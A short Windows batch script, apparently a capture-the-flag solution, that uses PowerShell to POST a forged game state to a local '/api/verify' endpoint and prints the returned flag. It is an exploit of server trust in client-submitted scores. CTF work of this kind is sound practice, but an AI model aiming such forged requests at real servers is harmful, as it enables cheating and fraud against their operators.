@echo off
set "URL=http://localhost:3000/api/verify"

echo [*] Sending exploited game state to the server...

:: PowerShell-Befehl aufrufen, um den POST-Request abzusetzen
powershell -Command ^
    "$body = @{ player_score = 0; npc_score = 24; round = 5 } | ConvertTo-Json;" ^
    "$response = Invoke-RestMethod -Uri '%URL%' -Method Post -Body $body -ContentType 'application/json';" ^
    "if ($response.success -eq $true) {" ^
    "    Write-Host '' ;" ^
    "    Write-Host '[+] Exploit Successful! Flag found:' -ForegroundColor Green;" ^
    "    Write-Host $response.flag -ForegroundColor Cyan;" ^
    "} else {" ^
    "    Write-Host '[-] Exploit Failed.' -ForegroundColor Red;" ^
    "}"

pause